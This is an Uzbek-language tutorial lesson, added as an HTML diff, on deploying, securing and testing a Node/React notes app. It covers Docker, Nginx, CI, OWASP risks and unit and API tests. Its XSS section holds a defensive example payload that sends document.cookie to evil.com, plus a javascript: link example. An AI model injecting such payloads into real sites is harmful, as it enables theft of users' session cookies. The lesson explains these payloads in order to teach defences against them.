@@ -1,0 +1,541 @@
+<!-- title: Deploy, xavfsizlik va testlash | desc: Ilovani internetga chiqarish (PaaS, VPS, Docker, Nginx, HTTPS), CI/CD, OWASP asosiy zaifliklari (XSS, SQLi, CSRF), unumdorlik hamda avtomatik testlar (node:test, Supertest, Vitest). | icon: 🚀 | level: Yuqori · ~150 daqiqa -->
+
+<p>Kompyuteringizda ishlaydigan ilova hali mahsulot emas. Uni haqiqiy foydalanuvchilarga yetkazish uchun: (1) internetdagi serverga
+<b>joylash (deploy)</b>, (2) hujumlardan <b>himoyalash</b>, (3) har bir o'zgarishdan keyin hech narsa buzilmaganini <b>avtomatik tekshirish</b>
+kerak. Bu dars full-stack dasturchini "kod yozuvchi"dan "mahsulot yetkazuvchi"ga aylantiradi.</p>
+
+<h2>Deploy: muhitlar va asosiy tushunchalar</h2>
+<ul>
+  <li><b>Development</b> — sizning kompyuteringiz: batafsil xatolar, avtomatik qayta yuklash.</li>
+  <li><b>Staging</b> — production'ning nusxasi, sinov uchun.</li>
+  <li><b>Production</b> — haqiqiy foydalanuvchilar: minifikatsiya, kesh, xatolar yashirilgan, HTTPS majburiy.</li>
+</ul>
+<p><b>12-Factor App</b> tamoyillarining eng muhimlari: konfiguratsiya muhit o'zgaruvchilarida; ilova holatsiz (fayllar va sessiyalar diskda emas —
+baza/S3/Redis'da); loglar <code>stdout</code> ga; build va ishga tushirish bosqichlari ajratilgan; dev va prod iloji boricha o'xshash.</p>
+
+<h3>Hosting turlari</h3>
+<div class="table-wrap"><table>
+<tr><th>Tur</th><th>Misollar</th><th>Afzalligi</th><th>Kamchiligi</th><th>Qachon</th></tr>
+<tr><td>Statik hosting</td><td>GitHub Pages, Netlify, Vercel, Cloudflare Pages</td><td>Bepul, tez (CDN), sozlash shart emas</td><td>Faqat frontend</td><td>Portfolio, landing, React SPA</td></tr>
+<tr><td>PaaS</td><td>Render, Railway, Fly.io, Heroku</td><td>Git push → deploy; baza, HTTPS tayyor</td><td>Qimmatroq, kamroq nazorat</td><td>Birinchi loyihalar, startaplar</td></tr>
+<tr><td>VPS</td><td>DigitalOcean, Hetzner, AWS EC2, mahalliy provayderlar</td><td>To'liq nazorat, arzon</td><td>Hammasini o'zingiz sozlaysiz va himoyalaysiz</td><td>O'rganish, maxsus talablar</td></tr>
+<tr><td>Konteyner platformalar</td><td>AWS ECS, Google Cloud Run, Kubernetes</td><td>Masshtablash</td><td>Murakkab</td><td>Katta tizimlar</td></tr>
+</table></div>
+
+<h2>Docker asoslari</h2>
+<p><b>Docker</b> ilovani barcha bog'liqliklari (Node versiyasi, paketlar, tizim kutubxonalari) bilan birga <b>konteyner</b>ga o'raydi.
+"Mening kompyuterimda ishlayapti" muammosi yo'qoladi: konteyner har qayerda bir xil ishlaydi.</p>
+<ul>
+  <li><b>Image</b> — ilovaning "qolipi" (faqat o'qish uchun), <code>Dockerfile</code> asosida quriladi.</li>
+  <li><b>Container</b> — image'ning ishlab turgan nusxasi.</li>
+  <li><b>Volume</b> — konteyner o'chsa ham saqlanadigan ma'lumot (baza fayllari).</li>
+  <li><b>Docker Compose</b> — bir nechta konteynerni (API + baza) bitta faylda tasvirlash.</li>
+</ul>
+<pre data-lang="bash">docker build -t notes-app .
+docker run -d -p 3000:3000 --env-file .env --name notes notes-app
+docker ps                    # ishlayotgan konteynerlar
+docker logs -f notes         # loglar
+docker exec -it notes sh     # konteyner ichiga kirish
+docker stop notes && docker rm notes</pre>
+
+<h2>Nginx, PM2 va HTTPS (VPS uchun)</h2>
+<p>VPS'da odatda Node.js ilovasi to'g'ridan-to'g'ri 80/443-portga qo'yilmaydi. Uning oldida <b>Nginx</b> turadi — <b>teskari proksi (reverse proxy)</b>:</p>
+<div class="diagram">
+  <div class="flow">
+    <div class="node">🌍 Internet<small>https://notes.example.uz</small></div>
+    <div class="arrow">→ 443 →</div>
+    <div class="node">Nginx<small>TLS, gzip, statik fayllar, rate limit</small></div>
+    <div class="arrow">→ 3000 →</div>
+    <div class="node">Node.js (PM2)<small>Express API</small></div>
+    <div class="arrow">→</div>
+    <div class="node">PostgreSQL</div>
+  </div>
+</div>
+<pre data-lang="nginx" data-title="/etc/nginx/sites-available/notes">server {
+    server_name notes.example.uz;
+
+    location / {
+        proxy_pass http://127.0.0.1:3000;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_set_header Upgrade $http_upgrade;       # WebSocket uchun
+        proxy_set_header Connection "upgrade";
+    }
+
+    client_max_body_size 5m;
+    gzip on;
+    gzip_types text/css application/javascript application/json image/svg+xml;
+}</pre>
+<pre data-lang="bash"># PM2 — Node jarayonlarini boshqaruvchi: yiqilsa qayta ishga tushiradi, server qayta yuklansa ham
+npm install -g pm2
+pm2 start src/server.js --name notes -i max     # CPU yadrolari soniga teng nusxa (cluster)
+pm2 save && pm2 startup                         # tizim ishga tushganda avtomatik
+pm2 logs notes
+pm2 reload notes                                # to'xtamasdan (zero-downtime) qayta yuklash
+
+# Bepul HTTPS sertifikat (Let's Encrypt) — avtomatik yangilanadi
+sudo apt install certbot python3-certbot-nginx
+sudo certbot --nginx -d notes.example.uz</pre>
+<div class="callout warn"><span class="t">VPS xavfsizligi minimum</span>
+SSH'da parol bilan kirishni o'chiring (faqat kalit), root bilan kirishni taqiqlang, firewall (<code>ufw allow OpenSSH; ufw allow 'Nginx Full'; ufw enable</code>),
+avtomatik xavfsizlik yangilanishlari, PostgreSQL portini (5432) tashqariga ochmang.</div>
+
+<h2>CI/CD — avtomatik tekshirish va deploy</h2>
+<p><b>CI (Continuous Integration)</b> — har bir push/PR'da testlar va linter avtomatik ishlaydi. <b>CD (Continuous Delivery/Deployment)</b> —
+<code>main</code> ga merge qilingan kod avtomatik deploy qilinadi. GitHub'da buning uchun <b>GitHub Actions</b> bor.</p>
+<pre data-lang="yaml" data-title=".github/workflows/ci.yml">name: CI
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    services:
+      postgres:                       # testlar uchun haqiqiy baza
+        image: postgres:17
+        env:
+          POSTGRES_PASSWORD: test
+          POSTGRES_DB: notes_test
+        ports: ['5432:5432']
+        options: >-
+          --health-cmd pg_isready --health-interval 5s --health-timeout 5s --health-retries 10
+    env:
+      DATABASE_URL: postgres://postgres:test@localhost:5432/notes_test
+      JWT_SECRET: test-secret-test-secret-test-secret
+      NODE_ENV: test
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: npm
+          cache-dependency-path: server/package-lock.json
+      - run: npm ci
+        working-directory: server
+      - run: psql "$DATABASE_URL" -f db/schema.sql
+        working-directory: server
+      - run: npm test
+        working-directory: server</pre>
+<p>GitHub'da <b>Settings → Branches → Branch protection</b> orqali "CI yashil bo'lmasa merge qilib bo'lmaydi" qoidasini yoqing.
+Render/Railway kabi platformalar esa <code>main</code> yangilanganda o'zi avtomatik deploy qiladi.</p>
+
+<h2>Veb-xavfsizlik: OWASP Top 10 asoslari</h2>
+<p><b>OWASP</b> — veb-xavfsizlik bo'yicha xalqaro tashkilot; uning "Top 10" ro'yxati eng xavfli zaifliklarni sanab o'tadi. Ularning ko'pchiligini
+oldingi darslarda uchratdik — endi tizimlashtiramiz.</p>
+<div class="table-wrap"><table>
+<tr><th>Zaiflik</th><th>Mohiyati</th><th>Himoya</th><th>Dars</th></tr>
+<tr><td><b>Broken Access Control</b> (IDOR)</td><td>Boshqa birovning ma'lumotiga kirish</td><td>Har so'rovda egalik/ruxsat tekshiruvi</td><td>11, 13</td></tr>
+<tr><td><b>Injection</b> (SQLi)</td><td>Ma'lumot kod sifatida bajariladi</td><td>Parametrlangan so'rovlar, ORM</td><td>10</td></tr>
+<tr><td><b>XSS</b></td><td>Hujumchi skripti boshqa foydalanuvchi brauzerida</td><td><code>textContent</code>, React ekranlashi, DOMPurify, CSP</td><td>5, 12</td></tr>
+<tr><td><b>CSRF</b></td><td>Boshqa sayt sizning cookie'ingiz bilan so'rov yuboradi</td><td><code>SameSite</code> cookie, CSRF token, GET'da o'zgartirmaslik</td><td>11</td></tr>
+<tr><td><b>Cryptographic Failures</b></td><td>Ochiq parollar, HTTP</td><td>bcrypt/argon2, HTTPS, maxfiy kalitlar <code>.env</code>da</td><td>8, 11</td></tr>
+<tr><td><b>Security Misconfiguration</b></td><td>Stack trace'lar ko'rinadi, standart parollar, ochiq portlar</td><td>Production'da xatolarni yashirish, <code>helmet</code>, firewall</td><td>9</td></tr>
+<tr><td><b>Vulnerable Components</b></td><td>Eskirgan paketlardagi ma'lum zaifliklar</td><td><code>npm audit</code>, Dependabot</td><td>8</td></tr>
+<tr><td><b>Authentication Failures</b></td><td>Brute-force, zaif parollar</td><td>Rate limit, 2FA, umumiy xato xabarlari</td><td>11</td></tr>
+<tr><td><b>SSRF</b></td><td>Server foydalanuvchi bergan URL'ga so'rov yuboradi (ichki tarmoqqa)</td><td>URL'larni whitelist bilan cheklash</td><td>—</td></tr>
+</table></div>
+
+<h3>XSS chuqurroq va Content Security Policy</h3>
+<pre data-lang="js">// Hujum: izoh sifatida yuboriladi
+const comment = `<img src=x onerror="fetch('https://evil.com/steal?c=' + document.cookie)">`;
+
+element.innerHTML = comment;     // ❌ skript bajariladi
+element.textContent = comment;   // ✅ matn sifatida ko'rinadi
+<p>{comment}</p>                 // ✅ React avtomatik ekranlaydi
+<div dangerouslySetInnerHTML={{ __html: comment }} />          // ❌
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(markdownHtml) }} />  // ✅ tozalangan
+
+// Yana bir yashirin XSS: javascript: havolalar
+<a href={user.website}>Sayt</a>    // website = "javascript:alert(1)" bo'lsa xavfli!
+// → URL'ni tekshiring: faqat http(s):// bilan boshlanganlarga ruxsat</pre>
+<p><b>CSP (Content-Security-Policy)</b> sarlavhasi — "zaxira himoya": XSS sodir bo'lsa ham, brauzer faqat ruxsat etilgan manbalardagi
+skriptlarni bajaradi. <code>helmet()</code> uni standart sozlamalar bilan qo'yadi:</p>
+<pre data-lang="js">app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],                       // inline <script> va boshqa domenlar bloklanadi
+      imgSrc: ["'self'", 'data:', 'https://cdn.example.uz'],
+      connectSrc: ["'self'"],
+    },
+  },
+}));</pre>
+
+<h3>CSRF</h3>
+<p>Siz <code>bank.uz</code> ga kirgansiz (cookie bor). <code>evil.com</code> sahifasida yashirin forma <code>bank.uz/transfer</code> ga POST yuboradi — brauzer
+cookie'ni <b>avtomatik qo'shadi</b>. Himoya: (1) cookie'larda <code>SameSite=Lax</code> yoki <code>Strict</code> (zamonaviy brauzerlarda Lax standart);
+(2) holatni o'zgartiruvchi amallar faqat POST/PUT/PATCH/DELETE; (3) qo'shimcha himoya uchun CSRF tokeni yoki <code>Origin</code> sarlavhasini tekshirish.</p>
+
+<h3>Xavfsizlik nazorat ro'yxati (deploy oldidan)</h3>
+<ul>
+  <li>☐ HTTPS majburiy, HTTP → HTTPS yo'naltirish</li>
+  <li>☐ <code>.env</code> git'da yo'q, production kalitlari kuchli va noyob</li>
+  <li>☐ <code>NODE_ENV=production</code>, xato javoblarida stack trace yo'q</li>
+  <li>☐ <code>helmet</code>, CORS faqat o'z domeningiz, <code>express.json({ limit })</code></li>
+  <li>☐ Login va ro'yxatdan o'tishda rate limit</li>
+  <li>☐ Barcha kirish ma'lumotlari validatsiya qilinadi; SQL faqat parametrlar bilan</li>
+  <li>☐ Har bir resursda egalik tekshiruvi</li>
+  <li>☐ Cookie: <code>HttpOnly; Secure; SameSite</code></li>
+  <li>☐ <code>npm audit</code> toza; Dependabot yoqilgan</li>
+  <li>☐ Bazaning zaxira nusxasi (backup) avtomatik va tiklash sinab ko'rilgan</li>
+</ul>
+
+<h2>Unumdorlik (performance)</h2>
+<div class="table-wrap"><table>
+<tr><th>Qatlam</th><th>Usullar</th></tr>
+<tr><td>Frontend</td><td>Build (minifikatsiya, tree-shaking), kod bo'lish (<code>React.lazy</code>), rasmlarni siqish (WebP/AVIF, <code>loading="lazy"</code>, o'lcham), shriftlarni kamaytirish, CDN</td></tr>
+<tr><td>Tarmoq</td><td>gzip/brotli, HTTP/2, statik fayllarga uzoq <code>Cache-Control</code> (fayl nomida xesh bilan)</td></tr>
+<tr><td>Backend</td><td>Event loop'ni bloklamaslik, ulanishlar pool'i, sahifalash, keraksiz ma'lumotni yubormaslik</td></tr>
+<tr><td>Baza</td><td>Indekslar, <code>EXPLAIN ANALYZE</code>, N+1 so'rovlardan qochish, kesh (Redis)</td></tr>
+</table></div>
+<p>O'lchash: Chrome DevTools → <b>Lighthouse</b> va <b>Performance</b> panellari; asosiy ko'rsatkichlar — <b>Core Web Vitals</b>: LCP (asosiy mazmun
+qancha tez ko'rinadi, &lt; 2.5s), INP (bosishga javob tezligi, &lt; 200ms), CLS (sahifa "sakrashi", &lt; 0.1).</p>
+<div class="callout info"><span class="t">N+1 muammosi</span>
+10 ta postni olib, keyin har biri uchun muallifni alohida so'rash = 1 + 10 so'rov. 1000 ta post bo'lsa — 1001 so'rov. Yechim: bitta <code>JOIN</code>
+yoki <code>WHERE id = ANY($1)</code> bilan hammasini bir so'rovda olish.</div>
+
+<h2>Testlash</h2>
+<p>Qo'lda tekshirish har safar 10 daqiqa oladi va bir narsani unutasiz. Avtomatik testlar sekundlarda ishlaydi va o'zgarishdan keyin
+"eski funksiyalar buzilmadimi?" degan savolga ishonchli javob beradi. Ular, shuningdek, kodni qo'rqmasdan qayta yozish (refactoring) imkonini beradi.</p>
+<h3>Test piramidasi</h3>
+<ul>
+  <li><b>Unit testlar</b> (ko'p, tez) — alohida funksiyalar: <code>hisobla(savat)</code>, reducer, validatsiya sxemasi.</li>
+  <li><b>Integratsion testlar</b> (o'rtacha) — bir necha qism birga: API marshruti + baza.</li>
+  <li><b>E2E testlar</b> (kam, sekin) — haqiqiy brauzerda foydalanuvchi ssenariysi: Playwright, Cypress.</li>
+</ul>
+<p>Yaxshi test <b>AAA</b> tuzilishiga ega: <b>Arrange</b> (tayyorlash) → <b>Act</b> (bajarish) → <b>Assert</b> (tekshirish). U amalga oshirishni emas,
+<b>xatti-harakatni</b> tekshiradi.</p>
+
+<h2>Amaliy misollar</h2>
+
+<div class="example"><div class="ex-head"><span class="ex-badge">Misol 1</span><h3>Unit testlar: Node.js'ning o'rnatilgan test runner'i</h3></div><div class="ex-body">
+<p>Node 20+ da qo'shimcha kutubxonasiz test yozish mumkin. 4-darsdagi savat funksiyasini test qilamiz.</p>
+<pre data-lang="js" data-title="src/cart.js">export const BEPUL_YETKAZISH = 1_000_000;
+export const YETKAZISH_NARXI = 25_000;
+
+export function hisobla(items, { promo } = {}) {
+  if (!Array.isArray(items)) throw new TypeError('items massiv bo\'lishi kerak');
+  const oraliq = items.reduce((s, { narx, soni, chegirma = 0 }) => {
+    if (soni < 0 || narx < 0) throw new RangeError('Manfiy qiymat');
+    return s + Math.round(narx * (1 - chegirma)) * soni;
+  }, 0);
+  const promodan = promo === 'BAHOR10' ? Math.round(oraliq * 0.9) : oraliq;
+  const yetkazish = promodan === 0 || promodan >= BEPUL_YETKAZISH ? 0 : YETKAZISH_NARXI;
+  return { oraliq, yetkazish, jami: promodan + yetkazish };
+}</pre>
+<pre data-lang="js" data-title="test/cart.test.js">import { describe, it } from 'node:test';
+import assert from 'node:assert/strict';
+import { hisobla, YETKAZISH_NARXI } from '../src/cart.js';
+
+describe('hisobla()', () => {
+  it('bo\'sh savat — hammasi nol', () => {
+    assert.deepEqual(hisobla([]), { oraliq: 0, yetkazish: 0, jami: 0 });
+  });
+
+  it('kichik xaridga yetkazish narxi qo\'shiladi', () => {
+    // Arrange
+    const items = [{ narx: 100_000, soni: 2 }];
+    // Act
+    const r = hisobla(items);
+    // Assert
+    assert.equal(r.oraliq, 200_000);
+    assert.equal(r.yetkazish, YETKAZISH_NARXI);
+    assert.equal(r.jami, 225_000);
+  });
+
+  it('1 000 000 dan oshsa yetkazish bepul (chegara qiymati)', () => {
+    assert.equal(hisobla([{ narx: 1_000_000, soni: 1 }]).yetkazish, 0);
+    assert.equal(hisobla([{ narx: 999_999, soni: 1 }]).yetkazish, YETKAZISH_NARXI);
+  });
+
+  it('mahsulot chegirmasi va promokod birga qo\'llanadi', () => {
+    const r = hisobla([{ narx: 500_000, soni: 2, chegirma: 0.1 }], { promo: 'BAHOR10' });
+    assert.equal(r.oraliq, 900_000);
+    assert.equal(r.jami, 810_000 + YETKAZISH_NARXI);
+  });
+
+  it('noto\'g\'ri kirishda xato tashlaydi', () => {
+    assert.throws(() => hisobla(null), TypeError);
+    assert.throws(() => hisobla([{ narx: 100, soni: -1 }]), /Manfiy/);
+  });
+});</pre>
+<pre data-lang="bash">node --test
+# ▶ hisobla()
+#   ✔ bo'sh savat — hammasi nol (0.4ms)
+#   ✔ kichik xaridga yetkazish narxi qo'shiladi (0.1ms)
+#   ✔ 1 000 000 dan oshsa yetkazish bepul (chegara qiymati) (0.1ms)
+#   ✔ mahsulot chegirmasi va promokod birga qo'llanadi (0.1ms)
+#   ✔ noto'g'ri kirishda xato tashlaydi (0.2ms)
+# ℹ tests 5  pass 5  fail 0
+
+node --test --watch                   # fayl o'zgarganda qayta
+node --test --experimental-test-coverage   # kod qamrovi</pre>
+<p>E'tibor bering: <b>chegara qiymatlari</b> (999 999 va 1 000 000), bo'sh kirish va xato holatlari alohida tekshirildi — xatolar aynan shu yerlarda yashirinadi.</p>
+</div></div>
+
+<div class="example"><div class="ex-head"><span class="ex-badge">Misol 2</span><h3>API integratsion testlari: Supertest + haqiqiy baza</h3></div><div class="ex-body">
+<p>13-darsdagi Notes API'ni test qilamiz. <code>app.js</code> va <code>server.js</code> alohida bo'lgani uchun (9-dars) testda port band qilinmaydi.</p>
+<pre data-lang="bash">npm install -D supertest
+npm pkg set scripts.test="node --env-file=.env.test --test"</pre>
+<pre data-lang="js" data-title="test/notes.api.test.js">import { describe, it, before, after, beforeEach } from 'node:test';
+import assert from 'node:assert/strict';
+import request from 'supertest';
+import { app } from '../src/app.js';
+import { pool } from '../src/db.js';
+
+// Har bir test toza bazada ishlaydi
+beforeEach(() => pool.query('TRUNCATE users, notes CASCADE'));
+after(() => pool.end());
+
+// Yordamchi: ro'yxatdan o'tib, cookie'li "agent" qaytaradi (brauzerga o'xshab cookie saqlaydi)
+async function signup(email = 'ali@test.uz') {
+  const agent = request.agent(app);
+  await agent.post('/api/auth/register')
+    .send({ name: 'Ali', email, password: 'parol12345' })
+    .expect(201);
+  return agent;
+}
+
+describe('Auth', () => {
+  it('ro\'yxatdan o\'tish httpOnly cookie qaytaradi', async () => {
+    const res = await request(app).post('/api/auth/register')
+      .send({ name: 'Vali', email: 'vali@test.uz', password: 'parol12345' })
+      .expect(201);
+    assert.equal(res.body.user.email, 'vali@test.uz');
+    assert.equal(res.body.user.password_hash, undefined);          // xesh hech qachon qaytmasin!
+    assert.match(res.headers['set-cookie'][0], /HttpOnly/);
+  });
+
+  it('takroriy email — 409', async () => {
+    await signup('a@test.uz');
+    await request(app).post('/api/auth/register')
+      .send({ name: 'Boshqa', email: 'A@TEST.UZ', password: 'parol12345' })   // katta harf ham!
+      .expect(409);
+  });
+
+  it('noto\'g\'ri parol — 401 va umumiy xabar', async () => {
+    await signup('b@test.uz');
+    const res = await request(app).post('/api/auth/login')
+      .send({ email: 'b@test.uz', password: 'xato-parol' })
+      .expect(401);
+    assert.equal(res.body.error.message, 'Email yoki parol noto\'g\'ri');
+  });
+});
+
+describe('Notes', () => {
+  it('cookie\'siz — 401', async () => {
+    await request(app).get('/api/notes').expect(401);
+  });
+
+  it('CRUD to\'liq sikli', async () => {
+    const agent = await signup();
+
+    const { body: created } = await agent.post('/api/notes')
+      .send({ title: 'Test', body: 'Matn', tags: ['Ish', 'ish'] })
+      .expect(201);
+    assert.deepEqual(created.tags, ['ish']);                         // kichik harf + takrorsiz
+
+    const { body: list } = await agent.get('/api/notes?q=matn').expect(200);
+    assert.equal(list.data.length, 1);
+
+    const { body: updated } = await agent.patch(`/api/notes/${created.id}`)
+      .send({ pinned: true }).expect(200);
+    assert.equal(updated.pinned, true);
+
+    await agent.delete(`/api/notes/${created.id}`).expect(204);
+    await agent.get('/api/notes').expect(200).then(r => assert.equal(r.body.data.length, 0));
+  });
+
+  it('🔒 boshqa foydalanuvchining eslatmasini o\'zgartirib bo\'lmaydi (IDOR)', async () => {
+    const ali = await signup('ali@test.uz');
+    const hacker = await signup('hacker@test.uz');
+    const { body: note } = await ali.post('/api/notes').send({ title: 'Maxfiy' }).expect(201);
+
+    await hacker.patch(`/api/notes/${note.id}`).send({ title: 'Buzildi' }).expect(404);
+    await hacker.delete(`/api/notes/${note.id}`).expect(404);
+    const { body } = await hacker.get('/api/notes').expect(200);
+    assert.equal(body.data.length, 0);
+  });
+
+  it('noma\'lum maydon (user_id) qabul qilinmaydi', async () => {
+    const agent = await signup();
+    const { body: note } = await agent.post('/api/notes').send({ title: 'X' });
+    await agent.patch(`/api/notes/${note.id}`).send({ user_id: '00000000-0000-0000-0000-000000000000' }).expect(400);
+  });
+
+  it('validatsiya: bo\'sh eslatma — 400 va tafsilotlar', async () => {
+    const agent = await signup();
+    const res = await agent.post('/api/notes').send({ title: '', body: '' }).expect(400);
+    assert.ok(Array.isArray(res.body.error.details));
+  });
+});</pre>
+<p>Xavfsizlik talablari ham test sifatida yozildi: endi kimdir kelajakda <code>AND user_id = $2</code> ni tasodifan o'chirib yuborsa, CI darhol qizarib, xatoni ko'rsatadi.</p>
+</div></div>
+
+<div class="example"><div class="ex-head"><span class="ex-badge">Misol 3</span><h3>React komponentlarini testlash: Vitest + Testing Library</h3></div><div class="ex-body">
+<pre data-lang="bash">cd client
+npm install -D vitest jsdom @testing-library/react @testing-library/user-event @testing-library/jest-dom</pre>
+<pre data-lang="js" data-title="client/vite.config.js (qo'shimcha)">export default defineConfig({
+  plugins: [react()],
+  test: {
+    environment: 'jsdom',
+    globals: true,
+    setupFiles: './src/test-setup.js',
+  },
+});
+// src/test-setup.js:  import '@testing-library/jest-dom/vitest';</pre>
+<pre data-lang="jsx" data-title="client/src/components/NoteEditor.test.jsx">import { render, screen } from '@testing-library/react';
+import userEvent from '@testing-library/user-event';
+import { vi } from 'vitest';
+import NoteEditor from './NoteEditor';
+
+describe('<NoteEditor />', () => {
+  it('bo\'sh eslatmani saqlamaydi va xabar ko\'rsatadi', async () => {
+    const onSave = vi.fn();
+    render(<NoteEditor onSave={onSave} />);
+
+    await userEvent.click(screen.getByRole('button', { name: 'Saqlash' }));
+
+    expect(onSave).not.toHaveBeenCalled();
+    expect(screen.getByText('Sarlavha yoki matn yozing')).toBeInTheDocument();
+  });
+
+  it('teglarni ajratib, tozalab yuboradi va formani tozalaydi', async () => {
+    const onSave = vi.fn().mockResolvedValue();
+    const user = userEvent.setup();
+    render(<NoteEditor onSave={onSave} />);
+
+    await user.type(screen.getByPlaceholderText('Sarlavha'), 'Xaridlar');
+    await user.type(screen.getByPlaceholderText(/Teglar/), ' Uy , bozor,, ');
+    await user.click(screen.getByRole('radio', { name: 'green' }));
+    await user.click(screen.getByRole('button', { name: 'Saqlash' }));
+
+    expect(onSave).toHaveBeenCalledWith({ title: 'Xaridlar', body: '', color: 'green', tags: ['uy', 'bozor'] });
+    expect(screen.getByPlaceholderText('Sarlavha')).toHaveValue('');
+  });
+
+  it('server xatosini ko\'rsatadi', async () => {
+    const onSave = vi.fn().mockRejectedValue(new Error('Tarmoq xatosi'));
+    render(<NoteEditor onSave={onSave} initial={{ title: 'A', body: '', tags: [] }} />);
+    await userEvent.click(screen.getByRole('button', { name: 'Saqlash' }));
+    expect(await screen.findByText('Tarmoq xatosi')).toBeInTheDocument();
+  });
+});</pre>
+<pre data-lang="bash">npx vitest          # watch rejimi
+npx vitest run      # bir marta (CI uchun)</pre>
+<p>Testing Library falsafasi: komponentni foydalanuvchi ko'rgandek test qiling — CSS sinflari yoki ichki state orqali emas, <b>rol, yozuv va matn</b> orqali
+(<code>getByRole('button', { name: 'Saqlash' })</code>). Shu tufayli testlar accessibility'ni ham bilvosita tekshiradi.</p>
+</div></div>
+
+<div class="example"><div class="ex-head"><span class="ex-badge">Misol 4</span><h3>Docker Compose bilan deploy va Render'ga joylash</h3></div><div class="ex-body">
+<h4>A) Ko'p bosqichli Dockerfile (frontend + backend bitta image'da)</h4>
+<pre data-lang="dockerfile" data-title="notes-app/Dockerfile"># 1-bosqich: React'ni build qilish
+FROM node:22-alpine AS client
+WORKDIR /app/client
+COPY client/package*.json ./
+RUN npm ci
+COPY client/ ./
+RUN npm run build
+
+# 2-bosqich: faqat production bog'liqliklari bilan server
+FROM node:22-alpine
+ENV NODE_ENV=production
+WORKDIR /app/server
+COPY server/package*.json ./
+RUN npm ci --omit=dev
+COPY server/ ./
+COPY --from=client /app/client/dist /app/client/dist
+# root emas — xavfsizroq
+USER node
+EXPOSE 3000
+HEALTHCHECK CMD wget -qO- http://localhost:3000/api/health || exit 1
+CMD ["node", "src/server.js"]</pre>
+<pre data-lang="text" data-title="notes-app/.dockerignore">**/node_modules
+**/.env
+**/dist
+.git</pre>
+<pre data-lang="yaml" data-title="notes-app/docker-compose.yml">services:
+  db:
+    image: postgres:17
+    restart: unless-stopped
+    environment:
+      POSTGRES_DB: notes
+      POSTGRES_PASSWORD: ${DB_PASSWORD}
+    volumes:
+      - pgdata:/var/lib/postgresql/data
+      - ./server/db/schema.sql:/docker-entrypoint-initdb.d/schema.sql:ro   # birinchi ishga tushishda
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U postgres"]
+      interval: 5s
+      retries: 10
+
+  app:
+    build: .
+    restart: unless-stopped
+    depends_on:
+      db:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgres://postgres:${DB_PASSWORD}@db:5432/notes    # "db" — servis nomi = host
+      JWT_SECRET: ${JWT_SECRET}
+      PORT: 3000
+    ports:
+      - "3000:3000"
+
+volumes:
+  pgdata:</pre>
+<pre data-lang="bash"># .env (compose uchun):  DB_PASSWORD=...  JWT_SECRET=...
+docker compose up -d --build
+docker compose logs -f app
+docker compose exec db psql -U postgres notes -c "SELECT count(*) FROM notes;"
+
+# Zaxira nusxa
+docker compose exec db pg_dump -U postgres notes > backup-$(date +%F).sql</pre>
+<p>VPS'da shu buyruqlarni ishga tushirib, oldiga Nginx + certbot qo'ysangiz — ilova tayyor.</p>
+
+<h4>B) Render.com'ga joylash (PaaS — eng oson yo'l)</h4>
+<ol>
+  <li>Loyihani GitHub'ga push qiling (7-dars).</li>
+  <li>Render'da <b>New → PostgreSQL</b> — bepul baza yarating, "Internal Database URL" ni nusxalang. <code>schema.sql</code> ni <code>psql</code> orqali bir marta ishga tushiring.</li>
+  <li><b>New → Web Service</b> → repozitoriyani tanlang → Runtime: <b>Docker</b> (yuqoridagi Dockerfile ishlatiladi).</li>
+  <li><b>Environment</b>: <code>DATABASE_URL</code>, <code>JWT_SECRET</code> (yangi, kuchli kalit), <code>NODE_ENV=production</code>.</li>
+  <li><b>Health Check Path</b>: <code>/api/health</code>. Deploy!</li>
+  <li>Bir necha daqiqadan so'ng ilova <code>https://notes-xxxx.onrender.com</code> da HTTPS bilan ishlaydi. Har bir <code>git push</code> — avtomatik qayta deploy.</li>
+  <li>O'z domeningiz: Render → Settings → Custom Domain, domen DNS'ida <code>CNAME</code> yozuvi (1-dars).</li>
+</ol>
+<div class="callout tip"><span class="t">Deploy'dan keyin</span>
+Xatolarni kuzatish (Sentry), uptime monitoring (UptimeRobot — sayt o'chsa xabar beradi), loglarni ko'rish va bazaning muntazam zaxira nusxalari —
+bularsiz production ilova "ko'r" holda ishlaydi.</div>
+</div></div>
+
+<h2>Mashqlar</h2>
+<div class="exercise">
+<h3>🏋️ Yakuniy topshiriqlar</h3>
+<ol>
+  <li>13-darsdagi loyihani Docker Compose bilan ishga tushiring, so'ng Render (yoki Railway) ga deploy qiling va havolani portfolio'ngizga qo'shing.</li>
+  <li>Loyihaga GitHub Actions CI qo'shing: lint + server testlari + client testlari. Ataylab xato commit qilib, CI qizarishini ko'ring.</li>
+  <li>Lighthouse auditidan o'tkazing va barcha 4 toifada 90+ ballga erishing.</li>
+  <li>OWASP nazorat ro'yxati bo'yicha o'z ilovangizni tekshiring; topilgan har bir muammo uchun test yozing va tuzating.</li>
+  <li>Playwright bilan bitta E2E test yozing: ro'yxatdan o'tish → eslatma yaratish → qidirish → chiqish.</li>
+</ol>
+</div>
+
+<div class="summary-box">
+<h3>🎓 Qo'llanma yakuni</h3>
+<p>Tabriklaymiz! Siz web qanday ishlashidan boshlab, HTML/CSS/JavaScript, Node.js, Express, PostgreSQL, autentifikatsiya, React,
+deploy, xavfsizlik va testlashgacha bo'lgan to'liq yo'lni bosib o'tdingiz. Bu — junior full-stack dasturchidan kutiladigan bilimlar poydevori.</p>
+<p><b>Keyingi qadamlar:</b></p>
+<ul>
+  <li><b>TypeScript</b> — katta loyihalarda xatolarni kod yozish paytidayoq ushlash.</li>
+  <li><b>Next.js</b> — React uchun full-stack freymvork (server rendering, API marshrutlari).</li>
+  <li><b>Tailwind CSS</b> yoki komponent kutubxonalari — tezroq dizayn.</li>
+  <li><b>Redis, WebSocket, navbatlar</b> — real vaqt va yuqori yuklama.</li>
+  <li>Eng muhimi: <b>loyihalar qiling</b>. Har bir yangi loyiha — qo'llanmadagi bilimlarning chuqurlashuvi. 3–5 ta sifatli, deploy qilingan
